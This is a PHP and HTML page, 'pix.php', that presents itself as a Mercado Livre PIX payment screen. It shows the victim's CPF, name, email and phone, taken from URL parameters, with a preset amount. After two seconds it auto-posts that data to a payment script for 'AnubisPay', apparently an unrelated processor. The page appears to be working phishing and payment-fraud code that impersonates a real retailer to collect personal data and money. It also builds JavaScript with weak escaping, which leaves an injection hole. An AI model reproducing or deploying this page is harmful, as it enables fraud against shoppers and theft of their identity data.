<?php
// pix.php - Redirecionador para sistema AnubisPay
// Recebe parâmetros: cpf, nome, value, email, telefone

// Função para limpar CPF (remove pontos e traço)
function limparCPF($cpf) {
    return preg_replace('/[^0-9]/', '', $cpf);
}

// Função para formatar nome
function formatarNome($nome) {
    return ucwords(strtolower(urldecode($nome)));
}

// Coleta parâmetros da URL
$cpf = $_GET['cpf'] ?? '';
$nome = $_GET['nome'] ?? '';
$value = $_GET['value'] ?? '12408'; // Valor em centavos
$email = $_GET['email'] ?? '';
$telefone = $_GET['telefone'] ?? '';

// Limpa e valida CPF
$cpf_limpo = limparCPF($cpf);
$nome_formatado = formatarNome($nome);

// Se não tem email, cria um baseado no CPF
if (empty($email)) {
    $email = "cpf{$cpf_limpo}@temp.com";
}

// Se não tem telefone, usa um padrão
if (empty($telefone)) {
    $telefone = "(11) 99999-9999";
}

// Converte valor para exibição
$valor_reais = number_format((float)$value / 100, 2, ',', '.');
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento PIX - Mercado Livre</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            background: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        .logo {
            max-width: 150px;
            margin-bottom: 20px;
        }
        h2 {
            color: #3483fa;
            margin-bottom: 10px;
        }
        .loading {
            color: #666;
            margin: 20px 0;
        }
        .spinner {
            border: 4px solid rgba(0,0,0,0.1);
            border-top: 4px solid #3483fa;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .info-box {
            background: #f9f9f9;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            text-align: left;
        }
        .info-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            font-size: 14px;
        }
        .info-item span:first-child {
            color: #666;
        }
        .error {
            color: #dc3545;
            background: #f8d7da;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
        }
        .redirect-note {
            margin-top: 20px;
            padding: 15px;
            background: #fff3cd;
            border-radius: 5px;
            font-size: 14px;
            color: #856404;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="gh.png" alt="Mercado Livre" class="logo">
        <h2>Processando Pagamento PIX</h2>
        
        <div class="info-box">
            <div class="info-item">
                <span>Cliente:</span>
                <span><?php echo htmlspecialchars($nome_formatado); ?></span>
            </div>
            <div class="info-item">
                <span>CPF:</span>
                <span><?php echo htmlspecialchars($cpf); ?></span>
            </div>
            <div class="info-item">
                <span>Valor:</span>
                <span>R$ <?php echo htmlspecialchars($valor_reais); ?></span>
            </div>
            <div class="info-item">
                <span>Email:</span>
                <span><?php echo htmlspecialchars($email); ?></span>
            </div>
            <div class="info-item">
                <span>Telefone:</span>
                <span><?php echo htmlspecialchars($telefone); ?></span>
            </div>
        </div>
        
        <div class="loading">
            <div class="spinner"></div>
            <p>Redirecionando para o sistema de pagamento...</p>
        </div>
        
        <div class="redirect-note">
            ⚠️ Sistema integrado com AnubisPay - Pagamentos PIX reais
        </div>
    </div>
    
    <script>
        // Aguarda 2 segundos e redireciona para o fluxo do AnubisPay
        setTimeout(function() {
            // Cria um formulário para enviar os dados via POST
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'processar_pagamento.php';
            
            // Adiciona campos ocultos
            const addHiddenField = (name, value) => {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = name;
                input.value = value;
                form.appendChild(input);
            };
            
            // Adiciona os dados
            addHiddenField('cpf', '<?php echo $cpf_limpo; ?>');
            addHiddenField('nome', '<?php echo addslashes($nome_formatado); ?>');
            addHiddenField('email', '<?php echo addslashes($email); ?>');
            addHiddenField('telefone', '<?php echo addslashes($telefone); ?>');
            
            // Adiciona ao body e submete
            document.body.appendChild(form);
            form.submit();
            
        }, 2000);
    </script>
</body>
</html>